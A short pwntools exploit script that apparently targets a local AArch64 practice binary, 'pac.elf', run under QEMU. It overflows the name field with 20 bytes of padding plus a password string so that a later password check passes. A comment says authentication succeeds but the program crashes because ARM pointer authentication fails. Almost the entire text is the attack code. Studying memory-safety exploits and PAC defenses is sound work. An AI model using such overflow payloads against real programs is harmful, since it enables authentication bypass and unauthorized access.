from pwn import *
import os

os.environ["QEMU_LD_PREFIX"] = "/usr/aarch64-linux-gnu"

context.arch = "aarch64"

elf = ELF("./pac.elf")

print(pwnlib.qemu.ld_prefix())

p = process("./pac.elf")


payload = b"A"*20 + b"thisisareallygoodpassword";

#p.recvuntil("Enter Name:")

p.sendline(payload)

#p.recvuntil("Enter password:")
p.sendline("thisisareallygoodpassword")

# At this point, it authenticates, but seg faults because the PAC didn't verify

p.interactive()